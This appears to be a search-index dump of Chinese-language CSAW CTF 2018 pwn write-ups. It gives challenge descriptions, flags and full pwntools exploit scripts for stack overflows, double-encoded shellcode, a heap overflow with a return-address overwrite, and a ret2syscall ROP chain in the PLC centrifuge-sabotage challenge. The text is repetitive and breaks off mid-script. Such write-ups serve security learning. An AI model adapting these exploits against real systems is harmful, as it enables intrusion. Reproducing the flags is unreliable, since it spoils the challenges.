0x200 , 'J' * 0xf7 ) # 9 to reset the heap create_alien ( 0xf8 , 'a' * 0xf7 ) # 10 killed create_alien ( 0x200 , 'b' * 0x1f0 + p64 ( 0x210 )[: - 1 ]) # 11 killed create_alien ( 0xf8 , 'c' * 0xf7 ) # 12 killed create_alien ( 0xf8 , 'd' * 0xf7 ) #13 kill_alien ( 10 ) # kill and overwrite to overflow kill_alien ( 11 ) create_alien ( 0xf8 , 'e' * 0xf8 ) # 14 => overflows and misaligns C's prev_size field. create_alien ( 0xf8 , 'f' * 0xf7 ) # 15 killed create_alien ( 0x200 , 'g' * 0x1ff ) # 16 this will be stuck into the \"modified\" position DO NOT KILL kill_alien ( 15 ) kill_alien ( 12 ) payload = 'h' * 0xf8 payload += p64 ( 0x21 ) payload += p64 ( environ ) payload += p64 ( 0x9 )[: - 1 ] create_alien ( len ( payload ) + 1 , payload ) # 17 p . recvuntil ( 'today. \\n ' ) p . sendline ( str ( 3 )) p . recvuntil ( 'rename? \\n ' ) p . sendline ( str ( 16 )) p . recvuntil ( 'rename \\x20 ' ) leak = p . recvuntil ( ' to? \\n ' ) leak = leak . strip ( ' to? \\n ' ) stack_leak = u64 ( leak + ' \\x00 ' * ( 8 - len ( leak ))) p . send ( p64 ( stack_leak )[: - 1 ]) print ( 'Environ: ' + hex ( stack_leak )) kill_alien ( 17 ) ret_offset = - 336 print ( \"Return address overwrite:\" + hex ( stack_leak + ret_offset )) payload = 'h' * 0xf8 payload += p64 ( 0x21 ) payload += p64 ( stack_leak + ret_offset ) payload += p64 ( 0x9 )[: - 1 ] create_alien ( len ( payload ) + 1 , payload ) # 18 in 17's place rename_alien ( 16 , p64 ( one_gadget )[: - 1 ]) # print(\"Puts (for reference): \" + hex(libc_base + e.symbols['puts'])) # print('Free hook: ' + hex(free_hook)) # print('One Gadget: ' + hex(one_gadget)) # pause() p . interactive ()","title":"\u5b98\u65b9\u89e3\u6cd5"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/","text":"Title \u00b6 big boii Description \u00b6 Only big boi pwners will get this one! Points \u00b6 25 Flag \u00b6 flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis} Setup \u00b6 Make sure that competitors can connect to the challenge Notes \u00b6 Mach-o 64-bit binary Provide dylibs to the competitors Place all linux cmds that can read files to different directory Solution \u00b6 see solver.py","title":"Title"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/#title","text":"big boii","title":"Title"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/#description","text":"Only big boi pwners will get this one!","title":"Description"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/#points","text":"25","title":"Points"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/#flag","text":"flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/#setup","text":"Make sure that competitors can connect to the challenge","title":"Setup"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/#notes","text":"Mach-o 64-bit binary Provide dylibs to the competitors Place all linux cmds that can read files to different directory","title":"Notes"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/#solution","text":"see solver.py","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/writeup/","text":"big boii \u00b6 Description \u00b6 Only big boi pwners will get this one! Points \u00b6 25 Flag \u00b6 flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis} Setup \u00b6 Make sure that competitors can connect to the challenge Notes \u00b6 Mach-o 64-bit binary Provide dylibs to the competitors Place all linux cmds that can read files to different directory Solution \u00b6 #!/usr/bin/env python from pwn import * context . log_level = 'debug' #p = process(\"./boi\") p = remote ( \"pwn.chal.csaw.io\" , 9000 ) #p = remote(\"localhost\", 1436) p . recvuntil ( \"??\" ) print \"before\" p . sendline ( 'A' * 20 + p32 ( 0xcaf3baee )) print \"after\" p . interactive ()","title":"bigboy | \u7b80\u5355\u6808\u6ea2\u51fa"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/writeup/#big-boii","text":"","title":"big boii"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/writeup/#description","text":"Only big boi pwners will get this one!","title":"Description"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/writeup/#points","text":"25","title":"Points"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/writeup/#flag","text":"flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/writeup/#setup","text":"Make sure that competitors can connect to the challenge","title":"Setup"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/writeup/#notes","text":"Mach-o 64-bit binary Provide dylibs to the competitors Place all linux cmds that can read files to different directory","title":"Notes"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/writeup/#solution","text":"#!/usr/bin/env python from pwn import * context . log_level = 'debug' #p = process(\"./boi\") p = remote ( \"pwn.chal.csaw.io\" , 9000 ) #p = remote(\"localhost\", 1436) p . recvuntil ( \"??\" ) print \"before\" p . sendline ( 'A' * 20 + p32 ( 0xcaf3baee )) print \"after\" p . interactive ()","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/pwn/doubletrouble/","text":"Doubletrouble \u00b6 Shellcoding with doubles Flag \u00b6 {4_d0ub1e_d0ub1e_3ntr3ndr3} make it 1337ish Description \u00b6 i didn't have a flag in mind, and didn't really have a description, although I could come up with one. Do you have any theme you are trying to stick with? credit: just say nsnc anywhere Hidden in a comment in the source code, I don't care. Feel free to take liberties with the challenge description, but at least use one pun.","title":"Doubletrouble"},{"location":"CSAW-CTF-2018-Quals/pwn/doubletrouble/#doubletrouble","text":"Shellcoding with doubles","title":"Doubletrouble"},{"location":"CSAW-CTF-2018-Quals/pwn/doubletrouble/#flag","text":"{4_d0ub1e_d0ub1e_3ntr3ndr3} make it 1337ish","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/pwn/doubletrouble/#description","text":"i didn't have a flag in mind, and didn't really have a description, although I could come up with one. Do you have any theme you are trying to stick with? credit: just say nsnc anywhere Hidden in a comment in the source code, I don't care. Feel free to take liberties with the challenge description, but at least use one pun.","title":"Description"},{"location":"CSAW-CTF-2018-Quals/pwn/doubletrouble/writeup/","text":"Doubletrouble \u00b6 Shellcoding with doubles Flag \u00b6 {4_d0ub1e_d0ub1e_3ntr3ndr3} make it 1337ish Description \u00b6 i didn't have a flag in mind, and didn't really have a description, although I could come up with one. Do you have any theme you are trying to stick with? credit: just say nsnc anywhere Hidden in a comment in the source code, I don't care. Feel free to take liberties with the challenge description, but at least use one pun. solution \u00b6 officail exp: #!/usr/bin/env python2 from pwn import * import binascii import codecs \"\"\" NOTE: Must be ran multiple times to brute force stack canary. \"\"\" def hextodouble ( hexstring ): print ( len ( hexstring )) return str ( \" %.16E \" % struct . unpack ( \"!d\" , codecs . decode ( hexstring , \"hex\" ))[ 0 ]) # context.log_level = 'debug' context . terminal = [ \"tmux\" , \"splitw\" , \"-h\" ] # p = process(\"./doubletrouble\") p = remote ( \"pwn.chal.csaw.io\" , 9002 ) stack_address = p . readline ()[ 2 : - 1 ] . strip () # shellcode shellcode1 = \"fcfc56f631580b6a\" shellcode2 = \"f9f9f968732f2f68\" shellcode3 = \"f8e3896e69622f68\" shellcode4 = \"f7fa80cdca89c931\" shellcodesortedbelowthis = \"f7f94e24f7f94e24\" p . sendline ( \"64\" ) for i in range ( 4 ): p . sendline ( hextodouble ( shellcodesortedbelowthis )) p . sendline ( \"-11\" ) for i in range ( 57 - 4 ): # subtract 4 for shellcode p . sendline ( hextodouble ( shellcodesortedbelowthis )) p . sendline ( hextodouble ( shellcode1 )) p . sendline ( hextodouble ( shellcode2 )) p . sendline ( hextodouble ( shellcode3 )) p . sendline ( hextodouble ( shellcode4 )) jmpebp = \"080497b800000000\" # 4.86192279173924203790903928618E-270 shellcode_location = ( \"080497b8\" + stack_address ) # that first part is pading to be sorted in the right spot print ( \"shellcode_location: \" ) print ( shellcode_location ) print ( hextodouble ( shellcode_location )) p . sendline ( hextodouble ( shellcode_location )) p . sendline ( hextodouble ( jmpebp )) p . sendline ( \"ls\" ) # p.recvuntil(\"flag\") p . interactive ()","title":"doubletrouble | \u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6392\u5e8f"},{"location":"CSAW-CTF-2018-Quals/pwn/doubletrouble/writeup/#doubletrouble","text":"Shellcoding with doubles","title":"Doubletrouble"},{"location":"CSAW-CTF-2018-Quals/pwn/doubletrouble/writeup/#flag","text":"{4_d0ub1e_d0ub1e_3ntr3ndr3} make it 1337ish","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/pwn/doubletrouble/writeup/#description","text":"i didn't have a flag in mind, and didn't really have a description, although I could come up with one. Do you have any theme you are trying to stick with? credit: just say nsnc anywhere Hidden in a comment in the source code, I don't care. Feel free to take liberties with the challenge description, but at least use one pun.","title":"Description"},{"location":"CSAW-CTF-2018-Quals/pwn/doubletrouble/writeup/#solution","text":"officail exp: #!/usr/bin/env python2 from pwn import * import binascii import codecs \"\"\" NOTE: Must be ran multiple times to brute force stack canary. \"\"\" def hextodouble ( hexstring ): print ( len ( hexstring )) return str ( \" %.16E \" % struct . unpack ( \"!d\" , codecs . decode ( hexstring , \"hex\" ))[ 0 ]) # context.log_level = 'debug' context . terminal = [ \"tmux\" , \"splitw\" , \"-h\" ] # p = process(\"./doubletrouble\") p = remote ( \"pwn.chal.csaw.io\" , 9002 ) stack_address = p . readline ()[ 2 : - 1 ] . strip () # shellcode shellcode1 = \"fcfc56f631580b6a\" shellcode2 = \"f9f9f968732f2f68\" shellcode3 = \"f8e3896e69622f68\" shellcode4 = \"f7fa80cdca89c931\" shellcodesortedbelowthis = \"f7f94e24f7f94e24\" p . sendline ( \"64\" ) for i in range ( 4 ): p . sendline ( hextodouble ( shellcodesortedbelowthis )) p . sendline ( \"-11\" ) for i in range ( 57 - 4 ): # subtract 4 for shellcode p . sendline ( hextodouble ( shellcodesortedbelowthis )) p . sendline ( hextodouble ( shellcode1 )) p . sendline ( hextodouble ( shellcode2 )) p . sendline ( hextodouble ( shellcode3 )) p . sendline ( hextodouble ( shellcode4 )) jmpebp = \"080497b800000000\" # 4.86192279173924203790903928618E-270 shellcode_location = ( \"080497b8\" + stack_address ) # that first part is pading to be sorted in the right spot print ( \"shellcode_location: \" ) print ( shellcode_location ) print ( hextodouble ( shellcode_location )) p . sendline ( hextodouble ( shellcode_location )) p . sendline ( hextodouble ( jmpebp )) p . sendline ( \"ls\" ) # p.recvuntil(\"flag\") p . interactive ()","title":"solution"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it/","text":"Title \u00b6 get it? Description \u00b6 Do you get it? Points \u00b6 100 Flag \u00b6 flag{y0u_deF_get_itls} Setup \u00b6 Make sure that competitors can connect to the challenge Solution \u00b6 super simple buffer overflow","title":"Title"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it/#title","text":"get it?","title":"Title"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it/#description","text":"Do you get it?","title":"Description"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it/#points","text":"100","title":"Points"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it/#flag","text":"flag{y0u_deF_get_itls}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it/#setup","text":"Make sure that competitors can connect to the challenge","title":"Setup"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it/#solution","text":"super simple buffer overflow","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it/writeup/","text":"get it? \u00b6 Description \u00b6 Do you get it? Points \u00b6 100 Flag \u00b6 flag{y0u_deF_get_itls} Setup \u00b6 Make sure that competitors can connect to the challenge Solution \u00b6 super simple buffer overflow #!/usr/bin/env python from pwn import * #p = process(\"./get_it\") #p = remote(\"localhost\", 1437) p = remote ( \"pwn.chal.csaw.io\" , 9001 ) p . recvuntil ( \"??\" ) p . sendline ( \"A\" * 0x28 + p64 ( 0x4005b6 )) p . interactive ()","title":"get it | \u7b80\u5355\u6808\u6ea2\u51fa"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it/writeup/#get-it","text":"","title":"get it?"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it/writeup/#description","text":"Do you get it?","title":"Description"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it/writeup/#points","text":"100","title":"Points"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it/writeup/#flag","text":"flag{y0u_deF_get_itls}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it/writeup/#setup","text":"Make sure that competitors can connect to the challenge","title":"Setup"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it/writeup/#solution","text":"super simple buffer overflow #!/usr/bin/env python from pwn import * #p = process(\"./get_it\") #p = remote(\"localhost\", 1437) p = remote ( \"pwn.chal.csaw.io\" , 9001 ) p . recvuntil ( \"??\" ) p . sendline ( \"A\" * 0x28 + p64 ( 0x4005b6 )) p . interactive ()","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/pwn/plc/","text":"PLC \u00b6 Points: 300 Flag: flag{1s_thi5_th3_n3w_stuxn3t_0r_jus7_4_w4r_g4m3} Description We've burrowed ourselves deep within the facility, gaining access to the programable logic controllers (PLC) that drive their nuclear enrichment centrifuges. Kinetic damage is necessary, we need you to neutralize these machines. You can access this challenge at https://wargames.ret2.systems/csaw_2018_plc_challenge *NOTE* The wargames platform is out of scope for this challenge, just use it to do the pwnable. Any kind of scanning or misuse will get your ip banned! However, if you do happen to find any security issues, please email us at `contact at ret2.io`","title":"PLC"},{"location":"CSAW-CTF-2018-Quals/pwn/plc/#plc","text":"Points: 300 Flag: flag{1s_thi5_th3_n3w_stuxn3t_0r_jus7_4_w4r_g4m3} Description We've burrowed ourselves deep within the facility, gaining access to the programable logic controllers (PLC) that drive their nuclear enrichment centrifuges. Kinetic damage is necessary, we need you to neutralize these machines. You can access this challenge at https://wargames.ret2.systems/csaw_2018_plc_challenge *NOTE* The wargames platform is out of scope for this challenge, just use it to do the pwnable. Any kind of scanning or misuse will get your ip banned! However, if you do happen to find any security issues, please email us at `contact at ret2.io`","title":"PLC"},{"location":"CSAW-CTF-2018-Quals/pwn/plc/writeup/","text":"PLC \u00b6 Points: 300 Flag: flag{1s_thi5_th3_n3w_stuxn3t_0r_jus7_4_w4r_g4m3} Description \u00b6 We've burrowed ourselves deep within the facility, gaining access to the programable logic controllers (PLC) that drive their nuclear enrichment centrifuges. Kinetic damage is necessary, we need you to neutralize these machines. You can access this challenge at https://wargames.ret2.systems/csaw_2018_plc_challenge NOTE The wargames platform is out of scope for this challenge, just use it to do the pwnable. Any kind of scanning or misuse will get your ip banned! However, if you do happen to find any security issues, please email us at contact at ret2.io solution \u00b6 \u53ea\u53ef\u4ee5\u5229\u7528wargame\u5e73\u53f0\u8fdb\u884c\u505a\u9898\uff0c\u4f46\u5e73\u53f0\u5df2\u7ecf\u63d0\u4f9b\u4e86\u53cd\u6c47\u7f16\u5668\u3001main\u51fd\u6570\u7684\u6e90\u7801\u3001python\u4ee3\u7801\u7f16\u8f91\u5668\u3001gdb\u8c03\u8bd5\u5668\u3002 \u529f\u80fd\u6bd4\u8f83\u7b80\u5355\uff0c\u6309\u5e73\u53f0\u6b65\u9aa4\u63d0\u793a\u5f80\u4e0b\u8d70\uff1a \u5148\u5206\u6790checksum\u9a8c\u8bc1\u51fd\u6570\uff0c\u6784\u9020\u80fd\u987a\u5e8f\u901a\u8fc7checksum\u68c0\u67e5\u7684\u56fa\u4ef6 \u5206\u6790xexecutefirmware\u51fd\u6570\uff0c\u53d1\u73b0 0x37 \u53ef\u4ee5\u63a7\u5236\u79bb\u5fc3\u673a\u8f6c\u901f\uff0c\u901a\u8fc7\u591a\u4e2a 0x37 \u6307\u4ee4\uff0c\u4f7f\u5f97\u79bb\u5fc3\u673a\u8f6c\u901f\u8d85\u6807\u3002 \u53d1\u73b0 0x32 ,\u53ef\u4ee5\u63a7\u52360x32\u540e\u9762\u4e00\u4f4d\u8986\u76d6\u6838\u53cd\u5e94\u5806\u6750\u6599\u7684\u5185\u5b58\u5730\u65b9\uff0c\u56e0\u6b64\u4f1a\u6709\u5185\u5b58\u8d8a\u754c\u5199\u7684\u73b0\u8c61 \u8c03\u8bd5\u53d1\u73b0\uff0c\u6838\u53cd\u5e94\u5806\u6750\u6599\u7684\u5185\u5b58\u5730\u65b9\u540e\u9762\u6709\u4e24\u4e2a\u51fd\u6570\u6307\u9488\uff0c\u56e0\u6b64\uff0c\u53ef\u4ee5\u901a\u8fc7\u6539\u5199\u51fd\u6570\u6307\u9488\uff0c\u4ece\u800c\u8fbe\u5230 call\u3000anycode \u7684\u76ee\u7684 \u8c03\u8bd5\u518d\u53d1\u73b0\uff0c\u5728main\u51fd\u6570\u4e2d\uff0c\u6709\u4e2a128\u5b57\u8282\u5927\u5c0f\u7684\u7f13\u51b2\u533a\uff0c\u53ef\u4ee5\u5b58\u653eret2syscall\u7684gadget\uff08\u56e0\u4e3a\u7a0b\u5e8fdisable\u4e86libc\u7684system\uff0c\u4ed6\u7684\u5b9e\u73b0\u65b9\u6cd5\u662f\u6539\u5199\u4e86execve\u5f00\u5934\u7684\u6307\u4ee4\uff0c\u4f7f\u5176\u6267\u884cabort\u51fd\u6570\uff09 \u53ef\u4ee5\u901a\u8fc7\u591a\u6b21pop\u3000ret,\u3000\u9000\u5230ret2syscall\u7684\u7f13\u51b2\u533a\u5730\u65b9\uff0c\u4ece\u800c\u987a\u5229\u62ff\u5230shell\u3002 import interact import sys import struct def p16 ( num ): return struct . pack ( \"<H\" , num ) def p64 ( num ): return struct . pack ( \"<Q\" , num ) def u64 ( sstr ): res , = struct . unpack ( \"<Q\" , sstr ) return res def u16 ( sstr ): res , = struct . unpack ( \"<H\" , sstr ) return res p = interact . Process () data = p . readuntil ( ' \\n ' ) #p.sendline(\"S\") p . sendline ( \"U\" ) #data = p.readuntil('\\n') system_offset = 0x45390 abort_offset = 0x36ec0 one_gg = 0x45216 #one_gg = 0xec0 a = [ \" \\x36 \" , \" \\x37 \" ] * ( 0x200 - 68 ) + [ \" \\x32 \" , \" \\x41 \" ] * ( 68 ) a [ 0 ] = \"F\" a [ 1 ] = \"W\" a [ 4 ] = \"9\" a [ 5 ] = \"9\" def validate_checksum ( buf ): checksum = 0 for i in range ( 2 , 0x200 ): checksum = (((((( checksum << 12 ) | ( checksum >> 4 )) & 0xFFFF ) + i ) ^ ( u16 ( buf [ i * 2 ] + buf [ i * 2 + 1 ])))) & 0xFFFF return checksum checkss = validate_checksum ( a ) a [ 2 ] = p16 ( checkss )[ 0 ] a [ 3 ] = p16 ( checkss )[ 1 ] #p.sendline('FW'+\"1\"*0x400) p . sendline ( \"\" . join ( a )) p . sendline ( \"E\" ) p . sendline ( \"S\" ) p . readuntil ( \"ENRICHMENT MATERIAL: \" + \"A\" * 68 ) data = p . readuntil ( ' \\n ' ) . strip () . ljust ( 8 , \" \\x00 \" ) data , = struct . unpack ( \"<Q\" , data ) # print \"llllllllllllllllll: \", hex(data) bin_base = data - 0xab0 print \"bin base: \" , hex ( bin_base ) a = [ \" \\x36 \" , \" \\x37 \" ] * ( 0x200 - 76 ) + [ \" \\x32 \" , \" \\x41 \" ] * ( 76 ) a [ 0 ] = \"F\" a [ 1 ] = \"W\" a [ 4 ] = \"9\" a [ 5 ] = \"9\" checkss = validate_checksum ( a ) a [ 2 ] = p16 ( checkss )[ 0 ] a [ 3 ] = p16 ( checkss )[ 1 ] p . sendline ( \"U\" ) p . sendline ( \"\" . join ( a )) p . sendline ( \"E\" ) p . sendline ( \"S\" ) p . readuntil ( \"ENRICHMENT MATERIAL: \" + \"A\" * 76 ) data = p . readuntil ( ' \\n ' ) . strip () . ljust ( 8 , \" \\x00 \" ) data , = struct . unpack ( \"<Q\" , data ) libc_base = data - abort_offset print \"libc base: \" , hex ( libc_base ) def convert_addr ( buf , instr ): a = [] for i in buf : a += [ instr , i ] return a syscall_ret = 0x00000000000bc375 + libc_base pop_rax_ret = 0x0000000000033544 + libc_base pop_rdi_ret = 0x0000000000021102 + libc_base pop_rsi_ret = 0x00000000000202e8 + libc_base pop_rdx_ret = 0x0000000000001b92 + libc_base bin_sh = 0x18cd57 + libc_base pop7_ret = 0x00000000000210f9 + libc_base pad = p64 ( pop_rax_ret ) pad += p64 ( 59 ) pad += p64 ( pop_rdi_ret ) pad += p64 ( bin_sh ) pad += p64 ( pop_rdx_ret ) pad += p64 ( 0 ) pad += p64 ( pop_rsi_ret ) pad += p64 ( 0 ) pad += p64 ( syscall_ret ) payload = \"A\" * ( 76 - 8 - 4 ) + \" \\x00 \" * 12 + p64 ( pop7_ret ) a = [ \" \\x37 \" , \" \\x37 \" ] * ( 0x200 - len ( payload )) + convert_addr ( payload , \" \\x32 \" ) a [ 0 ] = \"F\" a [ 1 ] = \"W\" a [ 4 ] = \"9\" a [ 5 ] = \"9\" checkss = validate_checksum ( a ) a [ 2 ] = p16 ( checkss )[ 0 ] a [ 3 ] = p16 ( checkss )[ 1 ] p . sendline ( \"U\" ) p . sendline ( \"\" . join ( a )) p . sendline ( \"E\" * 8 + pad ) # p.sendline(\"S\") p . interactive ()","title":"PLC | ret2syscall"},{"location":"CSAW-CTF-2018-Quals/pwn/plc/writeup/#plc","text":"Points: 300 Flag: flag{1s_thi5_th3_n3w_stuxn3t_0r_jus7_4_w4r_g4m3}","title":"PLC"},{"location":"CSAW-CTF-2018-Quals/pwn/plc/writeup/#description","text":"We've burrowed ourselves deep within the facility, gaining access to the programable logic controllers (PLC) that drive their nuclear enrichment centrifuges. Kinetic damage is necessary, we need you to neutralize these machines. You can access this challenge at https://wargames.ret2.systems/csaw_2018_plc_challenge NOTE The wargames platform is out of scope for this challenge, just use it to do the pwnable. Any kind of scanning or misuse will get your ip banned! However, if you do happen to find any security issues, please email us at contact at ret2.io","title":"Description"},{"location":"CSAW-CTF-2018-Quals/pwn/plc/writeup/#solution","text":"\u53ea\u53ef\u4ee5\u5229\u7528wargame\u5e73\u53f0\u8fdb\u884c\u505a\u9898\uff0c\u4f46\u5e73\u53f0\u5df2\u7ecf\u63d0\u4f9b\u4e86\u53cd\u6c47\u7f16\u5668\u3001main\u51fd\u6570\u7684\u6e90\u7801\u3001python\u4ee3\u7801\u7f16\u8f91\u5668\u3001gdb\u8c03\u8bd5\u5668\u3002 \u529f\u80fd\u6bd4\u8f83\u7b80\u5355\uff0c\u6309\u5e73\u53f0\u6b65\u9aa4\u63d0\u793a\u5f80\u4e0b\u8d70\uff1a \u5148\u5206\u6790checksum\u9a8c\u8bc1\u51fd\u6570\uff0c\u6784\u9020\u80fd\u987a\u5e8f\u901a\u8fc7checksum\u68c0\u67e5\u7684\u56fa\u4ef6 \u5206\u6790xexecutefirmware\u51fd\u6570\uff0c\u53d1\u73b0 0x37 \u53ef\u4ee5\u63a7\u5236\u79bb\u5fc3\u673a\u8f6c\u901f\uff0c\u901a\u8fc7\u591a\u4e2a 0x37 \u6307\u4ee4\uff0c\u4f7f\u5f97\u79bb\u5fc3\u673a\u8f6c\u901f\u8d85\u6807\u3002 \u53d1\u73b0 0x32 ,\u53ef\u4ee5\u63a7\u52360x32\u540e\u9762\u4e00\u4f4d\u8986\u76d6\u6838\u53cd\u5e94\u5806\u6750\u6599\u7684\u5185\u5b58\u5730\u65b9\uff0c\u56e0\u6b64\u4f1a\u6709\u5185\u5b58\u8d8a\u754c\u5199\u7684\u73b0\u8c61 \u8c03\u8bd5\u53d1\u73b0\uff0c\u6838\u53cd\u5e94\u5806\u6750\u6599\u7684\u5185\u5b58\u5730\u65b9\u540e\u9762\u6709\u4e24\u4e2a\u51fd\u6570\u6307\u9488\uff0c\u56e0\u6b64\uff0c\u53ef\u4ee5\u901a\u8fc7\u6539\u5199\u51fd\u6570\u6307\u9488\uff0c\u4ece\u800c\u8fbe\u5230 call\u3000anycode \u7684\u76ee\u7684 \u8c03\u8bd5\u518d\u53d1\u73b0\uff0c\u5728main\u51fd\u6570\u4e2d\uff0c\u6709\u4e2a128\u5b57\u8282\u5927\u5c0f\u7684\u7f13\u51b2\u533a\uff0c\u53ef\u4ee5\u5b58\u653eret2syscall\u7684gadget\uff08\u56e0\u4e3a\u7a0b\u5e8fdisable\u4e86libc\u7684system\uff0c\u4ed6\u7684\u5b9e\u73b0\u65b9\u6cd5\u662f\u6539\u5199\u4e86execve\u5f00\u5934\u7684\u6307\u4ee4\uff0c\u4f7f\u5176\u6267\u884cabort\u51fd\u6570\uff09 \u53ef\u4ee5\u901a\u8fc7\u591a\u6b21pop\u3000ret,\u3000\u9000\u5230ret2syscall\u7684\u7f13\u51b2\u533a\u5730\u65b9\uff0c\u4ece\u800c\u987a\u5229\u62ff\u5230shell\u3002 import interact import sys import struct def p16 ( num ): return struct . pack ( \"<H\" , num ) def p64 ( num ): return struct . pack ( \"<Q\" , num ) def u64 ( sstr ): res , = struct . unpack ( \"<Q\" , sstr ) return res def u16 ( sstr ): res , = struct . unpack ( \"<H\" , sstr ) return res p = interact . Process () data = p . readuntil ( ' \\n ' ) #p.sendline(\"S\") p . sendline ( \"U\" ) #data = p.readuntil('\\n') system_offset = 0x45390 abort_offset = 0x36ec0 one_gg = 0x45216 #one_gg = 0xec0 a = [ \" \\x36 \" , \" \\x37 \" ] * ( 0x200 - 68 ) + [ \" \\x32 \" , \" \\x41 \" ] * ( 68 ) a [ 0 ] = \"F\" a [ 1 ] = \"W\" a [ 4 ] = \"9\" a [ 5 ] = \"9\" def validate_checksum ( buf ): checksum = 0 for i in range ( 2 , 0x200 ): checksum = (((((( checksum << 12 ) | ( checksum >> 4 )) & 0xFFFF ) + i ) ^ ( u16 ( buf [ i * 2 ] + buf [ i * 2 + 1 ])))) & 0xFFFF return checksum checkss = validate_checksum ( a ) a [ 2 ] = p16 ( checkss )[ 0 ] a [ 3 ] = p16 ( checkss )[ 1 ] #p.sendline('FW'+\"1\"*0x400) p . sendline ( \"\" . join ( a )) p . sendline ( \"E\" ) p . sendline ( \"S\" ) p . readuntil ( \"ENRICHMENT MATERIAL: \" + \"A\" * 68 ) data = p . readuntil ( ' \\n ' ) . strip () . ljust ( 8 , \" \\x00 \" ) data , = struct . unpack ( \"<Q\" , data ) # print \"llllllllllllllllll: \", hex(data) bin_base = data - 0xab0 print \"bin base: \" , hex ( bin_base ) a = [ \" \\x36 \" , \" \\x37 \" ] * ( 0x200 - 76 ) + [ \" \\x32 \" , \" \\x41 \" ] * ( 76 ) a [ 0 ] = \"F\" a [ 1 ] = \"W\" a [ 4 ] = \"9\" a [ 5 ] = \"9\" checkss = validate_checksum ( a ) a [ 2 ] = p16 ( checkss )[ 0 ] a [ 3 ] = p16 ( checkss )[ 1 ] p . sendline ( \"U\" ) p . sendline ( \"\" . join ( a )) p . sendline ( \"E\" ) p . sendline ( \"S\" ) p . readuntil ( \"ENRICHMENT MATERIAL: \" + \"A\" * 76 ) data = p . readuntil ( ' \\n ' ) . strip () . ljust ( 8 , \" \\x00 \" ) data , = struct . unpack ( \"<Q\" , data ) libc_base = data - abort_offset print \"libc base: \" , hex ( libc_base ) def convert_addr ( buf , instr ): a = [] for i in buf : a += [ instr , i ] return a syscall_ret = 0x00000000000bc375 + libc_base pop_rax_ret = 0x0000000000033544 + libc_base pop_rdi_ret = 0x0000000000021102 + libc_base pop_rsi_ret = 0x00000000000202e8 + libc_base pop_rdx_ret = 0x0000000000001b92 + libc_base bin_sh = 0x18cd57 + libc_base pop7_ret = 0x00000000000210f9 + libc_base pad = p64 ( pop_rax_ret ) pad += p64 ( 59 ) pad += p64 ( pop_rdi_ret ) pad += p64 ( bin_sh ) pad += p64 ( pop_rdx_ret ) pad += p64 ( 0 ) pad += p64 ( pop_rsi_ret ) pad += p64 ( 0 ) pad += p64 ( syscall_ret ) payload = \"A\" * ( 76 - 8 - 4 ) + \" \\x00 \" * 12 + p64 ( pop7_ret ) a = [ \" \\x37 \" , \" \\x37 \" ] * ( 0x200 - len ( payload )) + convert_addr ( payload , \" \\x32 \" ) a [ 0 ] = \"F\" a [ 1 ] = \"W\" a [ 4 ] = \"9\" a [ 5 ] = \"9\" checkss = validate_checksum ( a ) a [ 2 ] = p16 ( checkss )[ 0 ] a [ 3 ] = p16 ( checkss )[ 1 ] p . sendline ( \"U\" ) p . sendline ( \"\" . join ( a )) p . sendline ( \"E\" * 8 + pad ) # p.sendline(\"S\") p . interactive ()","title":"solution"},{"location":"CSAW-CTF-2018-Quals/pwn/shellpointcode/","text":"Linked lists are great! They let you chain pieces of data together. (give shellpointcode*) (give shellpointcode.c","title":"Home"},{"location":"CSAW-CTF-2018-Quals/pwn/shellpointcode/writeup/","text":"shellpointcode \u00b6 Linked lists are great! They let you chain pieces of data together. (give shellpointcode*) (give shellpointcode.c solution \u00b6 \u4e2a\u4eba\u9898\u89e3 #!/usr/bin/env python2 # coding: utf-8 from pwn import * import itertools IP = \"pwn.chal.csaw.io\" PORT = 9005 # IP = \"127.0.0.1\" # PORT = 9999 context . log_level = 'DEBUG' context . terminal = [ 'tmux' , 'splitw' , '-h' ] context . arch = \"amd64\" mode = args [ 'MODE' ] . lower () binary = \"./shellpointcode\" # for i in range(0xb8, 0x500, 8): def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) if mode == \"remote\" : context . noptrace = True io = remote ( IP , PORT ) # libc 